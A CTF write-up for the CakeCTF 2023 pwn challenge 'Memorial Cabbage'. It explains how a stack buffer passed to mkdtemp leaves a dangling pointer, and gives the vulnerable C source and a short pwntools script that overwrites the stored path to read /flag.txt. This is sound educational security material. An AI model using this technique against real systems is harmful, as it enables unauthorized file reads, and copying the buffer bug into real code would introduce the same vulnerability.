---
title: Memorial Cabbage
date: 2023-11-23T23:24:31+02:00
description: Writeup for Memorial Cabbage [Cakectf 2023]
type: writeup
author: sunbather
tags:
- pwn
draft: false
---
___

## Challenge Description

Author: ptr-yudai
Description: Memorial Cabbage Unit 3

## Intuition

We can see the below source code for the challenge. It creates a temporary directory using template ``/tmp/cabbage.XXXXXX`` and then uses it to write a memo to it (``/tmp/cabbage.XXXXXX/memo.txt``).

However, what is interesting to notice in the manpage for ``mkdtemp()`` is that you're supposed to give a modifiable buffer:

```
DESCRIPTION
       The  mkdtemp() function generates a uniquely named temporary directory from template.  The last six characters of template must be XXXXXX and these are replaced with a string that makes the directory name unique.  The directory is then created with permissions 0700.
       Since it will be modified, template must not be a string constant, but should be declared as a character array.

RETURN VALUE
       The mkdtemp() function returns a pointer to the modified template string on success, and NULL on failure, in which case errno is set appropriately.
```

The pointer returned by it will be pointing towards the buffer you gave it. If you give it a stack buffer (like in the source code provided), when the function frame is finished it should be out of scope and might get overwritten by other stack allocations. We can exploit this by writing as much content as we can until we hit the directory name that was saved on the stack, which is further used when reading/writing to the memo file. We can overwrite the directory name to ``/flag.txt\x00``, which is smaller in size than ``strlen(TEMPDIR_TEMPLATE)``. This means that the second strcpy in both ``memo_r()`` and ``memo_w()`` won't have an effect on our chosen filename, as it will copy ``/memo.txt`` somewhere after our filename and fopen will stop at the first NULL byte (provided by us in the filename).

Therefore, this should open ``/flag.txt`` and read the flag for us. We can find all the offsets needed in multiple ways, through calculating offsets by finding the addresses with GDB and then using simple substractions, or we can use De Bruijn sequences, etc.

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define TEMPDIR_TEMPLATE "/tmp/cabbage.XXXXXX"

static char *tempdir;

void setup() {
  char template[] = TEMPDIR_TEMPLATE;

  setvbuf(stdin, NULL, _IONBF, 0);
  setvbuf(stdout, NULL, _IONBF, 0);

  if (!(tempdir = mkdtemp(template))) {
    perror("mkdtemp");
    exit(1);
  }
  if (chdir(tempdir) != 0) {
    perror("chdir");
    exit(1);
  }
}

void memo_r() {
  FILE *fp;
  char path[0x20];
  char buf[0x1000];

  strcpy(path, tempdir);
  strcpy(path + strlen(TEMPDIR_TEMPLATE), "/memo.txt");
  if (!(fp = fopen(path, "r")))
    return;
  fgets(buf, sizeof(buf) - 1, fp);
  fclose(fp);

  printf("Memo: %s", buf);
}

void memo_w() {
  FILE *fp;
  char path[0x20];
  char buf[0x1000];

  printf("Memo: ");
  if (!fgets(buf, sizeof(buf)-1, stdin))
    exit(1);

  strcpy(path, tempdir);
  strcpy(path + strlen(TEMPDIR_TEMPLATE), "/memo.txt");
  if (!(fp = fopen(path, "w")))
    return;
  fwrite(buf, 1, strlen(buf), fp);
  fclose(fp);
}

int main() {
  int choice;

  setup();
  while (1) {
    printf("1. Write memo\n"
           "2. Read memo\n"
           "> ");
    if (scanf("%d%*c", &choice) != 1)
      break;
    switch (choice) {
      case 1: memo_w(); break;
      case 2: memo_r(); break;
      default: return 0;
    }
  }
}
```

## Solution

```py
#!/usr/bin/env python3

from pwn import *

offset_to_filename = 0xff0  # found with gdb

target = process("./cabbage")
#target = remote("memorialcabbage.2023.cakectf.com", 9001)

target.sendlineafter(b"> ", b"1")
target.sendlineafter(b"Memo: ", b"a" * offset_to_filename + b"/flag.txt\x00")

target.sendlineafter(b"> ", b"2")
target.interactive()
```

### Flag

CakeCTF{.hidden_baby_we_eating_this_cabbage_cake}

(we lost the original flag lol and are writing this waaaay later)
